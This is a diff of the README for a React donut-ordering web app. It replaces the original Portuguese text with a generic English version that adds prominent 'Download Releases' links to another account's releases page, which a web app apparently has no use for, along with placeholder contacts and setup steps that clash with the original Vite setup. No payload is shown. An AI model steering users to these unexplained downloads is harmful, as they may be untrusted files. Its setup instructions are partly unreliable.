@@ -1,147 +1,103 @@
-# Flor de Nata Rosquinhas
+# 🌼 FlorDeNatas - Online Ordering System for Artisan Donuts
 
-<p align="center">
-  <img src="https://yfch1n4obf.ufs.sh/f/jgvuD015PrQW8PU2o6hIUzeDMoVJXKwbufYQAvrWqZ3Lh6mO" alt="Flor de Nata Logo" width="200" />
-</p>
+Welcome to **FlorDeNatas**, an online ordering system designed for artisan donuts. Built with React and Tailwind CSS, this application offers a user-friendly interface for placing orders, complete with WhatsApp integration. The responsive design draws inspiration from confectionery elements, ensuring a delightful experience for users.
 
-Uma plataforma de gerenciamento de pedidos profissional para "Flor de Nata Rosquinhas", uma empresa brasileira de rosquinhas artesanais. Esta aplicação web permite que os clientes façam pedidos diretamente através de uma interface intuitiva e integra-se com o WhatsApp para confirmação de pedidos.
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/mhdasci/FlorDeNatas/releases)
 
-## 🌟 Características
+## Table of Contents
 
-- **Design Responsivo**: Funciona perfeitamente em dispositivos móveis e desktop
-- **Formulário de Pedido**: Interface fácil de usar para os clientes selecionarem produtos
-- **Carrinho de Compras**: Os clientes podem adicionar vários itens ao pedido
-- **Integração com WhatsApp**: Envia detalhes do pedido diretamente para a empresa via WhatsApp
-- **Opções de Pagamento**: Suporte para PIX (sistema de pagamento instantâneo brasileiro)
-- **Design Visual Único**: Formas onduladas no cabeçalho e rodapé que imitam chocolate derretido e ondas suaves
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## 🚀 Tecnologias Utilizadas
+## Features
 
-- **Frontend**: React + TypeScript
-- **Estilização**: Tailwind CSS
-- **Ícones**: Lucide React
-- **Notificações**: React Hot Toast
-- **Ferramenta de Build**: Vite
+- **Intuitive Interface**: The design prioritizes ease of use, making it simple for customers to place orders.
+- **WhatsApp Integration**: Customers can directly contact us through WhatsApp for any inquiries or custom orders.
+- **Responsive Design**: The application works seamlessly on mobile and desktop devices.
+- **Custom Components**: Tailwind CSS allows for the creation of unique components tailored to the needs of our users.
+- **Form Validation**: Ensures that all user inputs are accurate and complete.
+- **SVG Animations**: Adds a touch of interactivity and visual appeal to the user experience.
+- **PWA Support**: The app can be installed on devices for offline access.
 
-## 📋 Pré-requisitos
+## Technologies Used
 
-Antes de começar, certifique-se de ter o seguinte instalado:
-- Node.js (v16.0.0 ou superior)
-- npm (v7.0.0 ou superior)
+This project leverages a variety of technologies to provide a smooth and efficient experience:
 
-## 🔧 Instalação
+- **React**: A JavaScript library for building user interfaces.
+- **Tailwind CSS**: A utility-first CSS framework for creating custom designs.
+- **TypeScript**: A superset of JavaScript that adds static types.
+- **Lucide React**: A library for beautiful SVG icons.
+- **React Hooks**: Enables the use of state and other React features without writing a class.
+- **React Hot Toast**: A library for displaying toast notifications.
 
-1. Clone o repositório
+## Getting Started
+
+To get started with **FlorDeNatas**, follow these steps:
+
+1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/seu-usuario/flor-de-natas.git
-   cd flor-de-natas
+   git clone https://github.com/mhdasci/FlorDeNatas.git
    ```
 
-2. Instale as dependências
+2. **Navigate to the Project Directory**:
+   ```bash
+   cd FlorDeNatas
+   ```
+
+3. **Install Dependencies**:
    ```bash
    npm install
    ```
 
-3. Inicie o servidor de desenvolvimento
+4. **Start the Development Server**:
    ```bash
-   npm run dev
+   npm start
    ```
 
-4. Abra seu navegador e acesse http://localhost:5173
+The application should now be running on `http://localhost:3000`.
 
-## 🏗️ Build para Produção
+## Usage
 
-1. Gere um build de produção
+Once the application is running, you can explore its features:
+
+- **Place an Order**: Navigate to the order page, select your desired donuts, and fill out the order form.
+- **Contact Us**: Use the WhatsApp button to reach out for questions or custom orders.
+- **Responsive Design**: Test the application on different devices to see how it adapts.
+
+## Contributing
+
+We welcome contributions to **FlorDeNatas**. To contribute:
+
+1. Fork the repository.
+2. Create a new branch:
    ```bash
-   npm run build
+   git checkout -b feature/YourFeature
    ```
-
-2. Visualize o build de produção localmente
+3. Make your changes and commit them:
    ```bash
-   npm run preview
+   git commit -m "Add some feature"
    ```
-
-## 🚢 Opções de Deployment
-
-### Vercel (Recomendado)
-
-1. Crie uma conta no [Vercel](https://vercel.com/signup)
-2. Instale o Vercel CLI:
+4. Push to the branch:
    ```bash
-   npm install -g vercel
+   git push origin feature/YourFeature
    ```
-3. Faça o deploy do seu projeto:
-   ```bash
-   vercel
-   ```
+5. Create a pull request.
 
-A Vercel é ideal para aplicações React, oferecendo:
-- HTTPS automático
-- CDN global
-- Integrações com GitHub
-- Previews de deploy para pull requests
-- Amplo plano gratuito para projetos pequenos e médios
+## License
 
-### Netlify
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-1. Crie uma conta no [Netlify](https://app.netlify.com/signup)
-2. Instale o Netlify CLI:
-   ```bash
-   npm install -g netlify-cli
-   ```
-3. Faça o deploy do seu projeto:
-   ```bash
-   netlify deploy
-   ```
+## Contact
 
-O Netlify também é excelente para aplicações React com:
-- Funcionalidades similares à Vercel
-- Tratamento de formulários se precisar adicionar funcionalidades no lado do servidor
-- Plano gratuito inclui 300 minutos de build por mês
+For any inquiries or feedback, please contact:
 
-### GitHub Pages
+- **Name**: Your Name
+- **Email**: your.email@example.com
+- **GitHub**: [Your GitHub Profile](https://github.com/yourprofile)
 
-1. Adicione homepage ao package.json:
-   ```json
-   "homepage": "https://seu-usuario.github.io/flor-de-natas"
-   ```
-2. Instale o pacote GitHub Pages:
-   ```bash
-   npm install -g gh-pages
-   ```
-3. Adicione scripts de deploy ao package.json:
-   ```json
-   "predeploy": "npm run build",
-   "deploy": "gh-pages -d dist"
-   ```
-4. Faça o deploy para o GitHub Pages:
-   ```bash
-   npm run deploy
-   ```
-
-## 🎨 Personalização
-
-As formas onduladas do cabeçalho e rodapé são SVGs personalizados que podem ser facilmente modificados. As cores principais são definidas no arquivo `tailwind.config.js`:
-
-- **Marrom escuro**: `#3E2723` (marrom-900)
-- **Marrom médio**: `#5D4037` (marrom-800)
-- **Marrom claro**: `#795548` (marrom-700)
-- **Rosa escuro**: `#ec407a` (rosa-500)
-- **Rosa médio**: `#f48fb1` (rosa-400)
-- **Rosa claro**: `#f8bbd0` (rosa-300)
-- **Rosa muito claro/fundo**: `#FFF9FB` (rosa-50)
-
-## 💡 Dicas para Desenvolvimento
-
-- Para modificar os produtos e preços, edite o arquivo `src/types.ts`
-- Para alterar o número de WhatsApp, edite o arquivo `src/components/OrderForm.tsx`
-- Para ajustar as formas onduladas, modifique os caminhos SVG no arquivo `src/App.tsx`
-
-## 📄 Licença
-
-Este projeto está licenciado sob a Licença MIT - veja o arquivo LICENSE para detalhes.
-
-## 📞 Contato
-
-Para perguntas ou suporte, entre em contato:
-- WhatsApp: [+55 31 97129-5198](https://wa.me/5531971295198)
+Thank you for checking out **FlorDeNatas**! We hope you enjoy using our online ordering system for artisan donuts. For the latest updates and releases, please visit our [Releases](https://github.com/mhdasci/FlorDeNatas/releases) section.
